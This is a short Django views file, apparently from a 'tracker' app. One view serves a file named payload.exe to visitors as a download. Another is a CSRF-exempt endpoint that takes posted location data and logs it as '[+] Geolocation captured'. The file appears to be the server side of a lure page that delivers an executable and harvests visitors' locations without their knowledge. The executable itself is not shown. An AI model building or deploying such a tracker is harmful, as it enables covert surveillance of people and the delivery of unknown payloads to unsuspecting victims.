from django.shortcuts import render
from django.http import FileResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt
import os, json

def index(request):
    return render(request, 'index.html')

def download_payload(request):
    filepath = os.path.join('tracker', 'static', 'payload.exe')
    return FileResponse(open(filepath, 'rb'), as_attachment=True, filename='payload.exe')

@csrf_exempt
def geo_capture(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        print(f"[+] Geolocation captured: {data}")
        return JsonResponse({'status': 'ok'})
